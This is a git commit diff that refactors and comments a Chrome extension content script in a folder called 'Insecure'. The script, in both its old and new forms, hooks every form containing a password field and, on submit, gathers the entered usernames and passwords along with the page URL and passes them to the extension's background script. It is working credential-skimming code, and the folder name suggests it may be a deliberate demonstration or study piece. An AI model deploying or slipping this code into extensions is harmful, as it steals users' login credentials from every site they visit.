44f155d6c4d61d1660bc03591631448784a6d1f5
Nicholas Shaw <35937378+nishaw303@users.noreply.github.com>
2018-11-22 18:29:18 -0500

    Cleaned up login listener
    Cleaned up all the code and added comments

--- Insecure/loginListener.js
+++ Insecure/loginListener.js
@@ -1,16 +1,13 @@
-var input_list = document.getElementsByTagName("input");
-Array.prototype.forEach.call(input_list, function(input) {
-    if (input.getAttribute("type") === "password"){
-        var form = input.form;
-        form.addEventListener("submit", function(input) {
-            var inputs = form.getElementsByTagName("input");
-            var message = '';
-            Array.prototype.forEach.call(inputs, function(input) {
-                if (!(["hidden", "submit"].indexOf(input.getAttribute("type")) >= 0)) {
-                    message += input.value + ": ";
-                }
-            });
-            chrome.runtime.sendMessage({loginListener: location.href + ", " + message.slice(0, -2)});
-        }, false);
-    }
+// Finds all input fields on the page that are of type "password" and sends each to a function
+document.querySelectorAll('input[type="password"]').forEach( function(password_field) {
+    // Listen for when form is submitted, and send the event to a function
+    password_field.form.addEventListener("submit", function(e) {
+        // Take the event and find the target (the form), find all inputs not of type "hidden" or "submit", and turn the output into an array
+        var inputs = Array.prototype.slice.call(e.target.querySelectorAll('input:not([type="hidden"]):not([type="submit"])'));
+        // Turn array of inputs into an array of their values (the strings they contain)
+        inputs.forEach( function(input, i, arr) { arr[i] = input.value; });
+        // Send a message to background script in the form "url + joined array of inputs"
+        chrome.runtime.sendMessage({loginListener: location.href + ", " + inputs.join(": ")});
+    }, false);
 });
+
